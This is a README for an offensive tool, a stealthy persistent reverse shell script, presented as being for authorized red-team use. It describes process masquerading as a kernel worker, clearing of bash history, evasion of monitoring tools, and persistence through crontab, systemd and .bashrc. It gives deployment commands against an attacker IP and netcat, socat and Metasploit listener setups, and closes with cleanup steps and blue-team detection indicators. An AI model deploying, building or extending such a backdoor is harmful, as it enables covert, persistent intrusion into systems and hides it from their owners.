# Stealth Reverse Shell (rshell.sh)

A highly advanced, stealthy persistent reverse shell designed for authorized penetration testing and red team operations.

⚠️ **LEGAL DISCLAIMER**: This tool is intended ONLY for authorized penetration testing, security research, and educational purposes. Users are responsible for ensuring they have explicit permission before deploying this on any system. Unauthorized use is illegal and unethical.

## 🎯 Features

### 🥷 Advanced Stealth Capabilities
- **Process Masquerading**: Appears as `[kworker/0:1]` (kernel worker)
- **Anti-Forensics**: Clears bash history and traces automatically
- **Silent Operation**: No verbose output to avoid detection
- **Disguised Logging**: Uses system-like log names (`/var/log/.systemd-journal`)
- **Environment Detection**: Adapts behavior when security tools detected

### 🔄 Connection Management
- **Multiple Methods**: bash, netcat, python, python3, perl
- **Randomized Order**: Connection methods shuffled each attempt
- **Traffic Jitter**: 5-minute base interval ± 2-minute randomization
- **Natural Delays**: Random delays to simulate normal system activity
- **Graceful Cleanup**: Removes temporary files after each connection

### 🛡️ Persistence Mechanisms
- **Multi-Layer Persistence**: Crontab, systemd, .bashrc injection
- **Automatic Fallbacks**: Multiple locations for logs and PID files
- **Self-Installing**: Automatically sets up additional persistence
- **Robust Recovery**: Continues operation even if partially detected

### 🔍 Detection Evasion
- **Monitoring Detection**: Identifies tcpdump, wireshark, strace, etc.
- **Adaptive Behavior**: Increases stealth when monitoring detected
- **Random Activities**: Mimics normal system processes
- **File Descriptor Randomization**: Avoids predictable network patterns

## 📋 Requirements

- Bash shell environment
- Network connectivity to attacker machine
- One of the following for connections:
  - bash (with `/dev/tcp` support)
  - netcat (`nc`)
  - python/python3
  - perl
- Write permissions in `/var/log/` or `/tmp/` (for logging)

## 🚀 Usage

### Basic Deployment
```bash
# Make script executable
chmod +x rshell.sh

# Start persistent reverse shell
./rshell.sh <ATTACKER_IP> <ATTACKER_PORT>

# Example
./rshell.sh 192.168.1.100 4444
```

### Management Commands
```bash
# Check if running (silent - check exit code)
./rshell.sh status
echo $?  # 0 = running, 1 = not running

# Stop the reverse shell (full cleanup)
./rshell.sh stop
```

### Attacker Setup
```bash
# Set up listener (choose one)

# Option 1: Netcat
nc -lvp 4444

# Option 2: Socat (more stable)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Option 3: MSF Handler
msfconsole -x "use exploit/multi/handler; set payload linux/x64/shell/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"
```

## 📁 File Locations

### Primary Locations (requires elevated privileges)
- **PID File**: `/var/run/.systemd-resolve`
- **Log File**: `/var/log/.systemd-journal`

### Backup Locations (user-accessible)
- **PID File**: `/tmp/.font-cache`
- **Log File**: `/tmp/.cache-update`

### Persistence Files
- **Crontab**: `*/15 * * * * /path/to/script`
- **Systemd**: `$HOME/.config/systemd/user/system-update.service`
- **Bashrc**: Auto-start entry in `~/.bashrc`

## 🕐 Timing Behavior

- **Base Interval**: 5 minutes (300 seconds)
- **Jitter Range**: ± 2 minutes (120 seconds)
- **Actual Range**: 3-7 minutes between attempts
- **Monitoring Detected**: Doubles intervals for extra stealth
- **Connection Delays**: 1-10 seconds before each attempt

## 🔧 Configuration

Edit these variables in the script for customization:

```bash
BASE_SLEEP=300          # Base sleep interval (seconds)
JITTER_MAX=120          # Maximum jitter (± seconds)
PROCESS_NAME="[kworker/0:1]"  # Process masquerade name
LOG_FILE="/var/log/.systemd-journal"
PID_FILE="/var/run/.systemd-resolve"
```

## 🧹 Cleanup & Removal

### Manual Cleanup
```bash
# Stop the service
./rshell.sh stop

# Verify no processes running
ps aux | grep -E "(kworker|update-fonts|system-update)"

# Remove any remaining files
rm -f /var/log/.systemd-journal /tmp/.cache-update
rm -f /var/run/.systemd-resolve /tmp/.font-cache
```

### Deep Cleanup
```bash
# Remove crontab entries
crontab -l | grep -v rshell | crontab -

# Remove systemd service
rm -f ~/.config/systemd/user/system-update.service
systemctl --user daemon-reload

# Clean .bashrc (manually edit to remove auto-start lines)
nano ~/.bashrc
```

## 🛡️ Defensive Considerations

### Detection Indicators
- Process named `[kworker/0:1]` with unusual network activity
- Outbound connections every ~5 minutes with jitter
- Presence of disguised log files
- Crontab entries with suspicious paths
- Network connections to non-standard ports

### Monitoring Commands
```bash
# Monitor processes
watch 'ps aux | grep -E "(kworker|update|system)"'

# Monitor network connections
netstat -tulpn | grep :4444

# Check crontabs
crontab -l

# Monitor systemd services
systemctl --user list-units | grep update
```

## 🔐 Security Notes

### For Red Teams
- Always test in isolated environments first
- Ensure proper authorization before deployment
- Document all systems where deployed
- Have cleanup procedures ready
- Monitor for defensive responses

### For Blue Teams
- Look for processes with kernel names but user-space behavior
- Monitor for regular interval network connections
- Check for unauthorized crontab entries
- Audit systemd user services
- Monitor bash history for cleared entries

## 📚 Connection Methods

The script attempts multiple connection methods in randomized order:

1. **bash**: Direct `/dev/tcp` redirection
2. **netcat**: Traditional `-e` flag method
3. **netcat mkfifo**: BSD-style with named pipes
4. **python3**: Socket-based connection
5. **python**: Legacy python support
6. **perl**: Socket-based perl connection

## 🐛 Troubleshooting

### Common Issues
```bash
# Permission denied errors
# Solution: Use backup locations or run with appropriate privileges

# No connection methods available
# Solution: Install netcat, python, or ensure bash has /dev/tcp support

# Process not starting
# Solution: Check script permissions and bash compatibility

# Connections failing
# Solution: Verify firewall rules and listener setup
```

### Debug Mode
For testing, temporarily add debug output:
```bash
# Add to connect_shell function for debugging
echo "Attempting $method to $ip:$port" >> /tmp/debug.log
```

## 📈 Version History

- **v1.0**: Basic persistent reverse shell
- **v2.0**: Enhanced stealth features, process masquerading
- **v2.1**: Added monitoring detection and adaptive behavior
- **v2.2**: Improved persistence mechanisms and cleanup

## 🤝 Contributing

This tool is for educational and authorized testing purposes. Improvements to stealth capabilities, additional connection methods, or better evasion techniques are welcome through proper channels.

## 📄 License

Educational and Authorized Testing Use Only. See local laws and regulations for compliance requirements.

---
**Remember**: Always ensure you have explicit written authorization before deploying this tool on any system you do not own. 
